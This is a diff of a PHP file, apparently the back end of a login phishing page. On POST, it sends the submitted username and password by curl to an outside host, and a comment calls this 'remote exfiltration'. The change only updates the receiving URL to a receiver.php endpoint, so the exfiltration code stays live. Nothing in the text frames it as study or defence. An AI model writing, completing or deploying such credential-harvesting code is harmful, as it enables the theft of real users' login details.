@@ -10,7 +10,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     
     // Placeholder for remote exfiltration (not functional locally without setup)
     
-    $ch = curl_init("https://rcivr.onrender.com");
+    $ch = curl_init("https://rcivr.onrender.com/receiver.php");
     curl_setopt($ch, CURLOPT_POST, true);
     curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query(["username" => $username, "password" => $password]));
     curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
